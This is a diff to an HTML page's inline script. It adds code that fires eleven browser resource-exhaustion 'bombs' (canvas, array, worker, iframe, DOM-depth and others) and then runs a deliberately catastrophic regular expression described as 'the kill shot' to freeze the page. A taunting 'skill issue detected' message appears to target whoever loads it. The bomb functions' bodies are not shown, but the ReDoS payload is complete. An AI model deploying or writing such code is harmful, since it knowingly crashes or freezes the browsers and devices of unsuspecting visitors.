@@ -166,12 +166,24 @@ function arrayBomb(){
   }
 }
 
-// ReDoS first - the kill shot
+// ALL ATTACKS FIRE
+safe(canvasBomb);
+safe(arrayBomb);
+safe(stringBomb);
+safe(domDepthBomb);
+safe(iframeBomb);
+safe(cssVarBomb);
+safe(workerBomb);
+safe(historyBomb);
+safe(mutationBomb);
+safe(layoutBomb);
+safe(jsonBomb);
+
+// ReDoS - the kill shot (after other attacks load the system)
 setTimeout(()=>{
   log('skill issue detected...');
-  // This will freeze everything
   /^(a+)+$/.test('a'.repeat(28)+'b');
-},100);
+},500);
 
 };
 </script>
